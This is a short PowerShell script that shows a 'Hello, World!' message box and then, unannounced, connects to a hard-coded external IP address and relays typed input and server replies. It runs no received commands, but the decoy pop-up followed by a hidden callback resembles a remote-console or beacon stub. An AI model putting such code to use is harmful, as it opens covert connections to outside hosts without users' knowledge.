Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Create a message box with "Hello, World!" message
[System.Windows.Forms.MessageBox]::Show("Hello, World!", "PowerShell Alert", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)


$ip = "139.144.172.167"
$port = 87

try {
    $client = New-Object System.Net.Sockets.TcpClient
    $client.Connect($ip, $port)

    $stream = $client.GetStream()
    $reader = New-Object System.IO.StreamReader($stream)
    $writer = New-Object System.IO.StreamWriter($stream)

    while ($true) {
        $input = Read-Host
        $writer.WriteLine($input)
        $writer.Flush()

        $output = $reader.ReadLine()
        if ($output -eq $null) {
            break
        }
        Write-Host $output
    }
}
catch {
    Write-Host "Failed to connect to the remote console."
}
finally {
    if ($client -ne $null) {
        $client.Close()
    }
}
